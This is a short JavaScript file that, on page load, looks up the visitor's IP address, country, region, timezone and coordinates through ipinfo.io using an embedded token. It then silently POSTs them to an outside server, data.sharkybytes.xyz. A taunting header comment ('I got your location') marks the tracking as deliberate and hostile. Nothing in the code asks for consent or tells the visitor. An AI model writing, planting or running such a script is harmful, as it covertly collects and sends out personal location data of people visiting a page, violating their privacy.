//** It's too late now, I got your location. */ //

// UID //
const uid = () => {
    const head = Date.now().toString(36);
    const randomID = Math.random(head).toString(36).substring(2);
    return randomID
};

// POST METHOD FUNCTION //
async function postRequest() {
    const id = uid();
    const apiURL = 'https://data.sharkybytes.xyz/'; // API URL
    const request = await fetch("https://ipinfo.io/json?token=0282fbb2286a84"); // LOCATOR URL
    const { ip, country, region, timezone, loc } = await request.json();
    const postData = {
        '_id': id,
        'IPv4': ip,
        'country': country,
        'region': region,
        'timezone': timezone,
        'coordinates': loc
    } // Data To Post
     try {
        const response = await fetch(apiURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData), // Convert data to JSON Format
        });

        const result = await response.json(); // Parse JSON Response
        console.log(result)
     } catch (error) {
        console.error(error)
     }
}
window.onload = function() {
    postRequest();
}